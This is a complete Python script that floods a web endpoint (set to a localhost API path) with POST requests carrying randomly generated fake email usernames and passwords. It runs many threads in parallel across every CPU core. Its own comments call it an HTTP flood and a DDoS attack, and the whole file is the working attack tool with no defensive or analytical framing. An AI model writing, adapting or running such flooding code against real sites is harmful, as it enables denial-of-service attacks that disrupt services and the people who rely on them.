import requests
import random
import string
import json
from threading import Thread
from multiprocessing import Process, cpu_count


# Constants
URL = 'http://localhost/api/core/data'
FIRST_NAMES = tuple(first_name.lower() for first_name in json.load(open('first_names.json')))
LAST_NAMES = tuple(last_name.lower() for last_name in json.load(open('last_names.json')))
EMAIL_PROVIDERS = ('gmail.com', 'yahoo.com', 'aol.com', 'outlook.com', 'icloud.com')
CHARS = string.ascii_letters + string.digits + '!@#$%&'


# Send many post requests to the URL
def attack_url():
    for _ in range(100):
        # Randomly generate a fake username and password
        first_name = random.choice(FIRST_NAMES)
        last_name = random.choice(LAST_NAMES)
        extra_digits = ''.join(random.choices(string.digits, k=random.randint(1, 5)))
        email = random.choice(EMAIL_PROVIDERS)

        username = first_name + last_name + extra_digits + '@' + email
        password = ''.join(random.choices(CHARS, k=random.randint(8, 20)))

        # Post the fake data to the URL if it has been provided
        if URL:
            try:  # If an error occurs, terminate the function
                data = {
                    # NOTE: The field names may vary depending on the URL form
                    'username': username,
                    'password': password
                }
                requests.post(URL, allow_redirects=False, data=data)
            except:
                print(f'Failed to send {username} and password {password} to the URL!')
                return


# Sets up and executes the HTTP flood against the URL
def flood_url():
    # Use threading to speed up the number of posts made
    threads = [Thread(target=attack_url, daemon=True) for _ in range(100)]
    
    # Destroy them!
    for thread in threads:
        thread.start()
    
    # Make the program wait until all the threads are done
    for thread in threads:
        thread.join()


# Uses multiple CPUs to flood the URL
def execute_ddos_attack():
    # Use multiprocessing to speed up the number of posts made
    processes = [Process(target=flood_url, daemon=True) for _ in range(cpu_count())]

    # Destroy them!
    for process in processes:
        process.start()

    # Make the program wait until all the processes are done
    for process in processes:
        process.join()


# Execute the program if the script is run directly
if __name__ == '__main__':
    execute_ddos_attack()
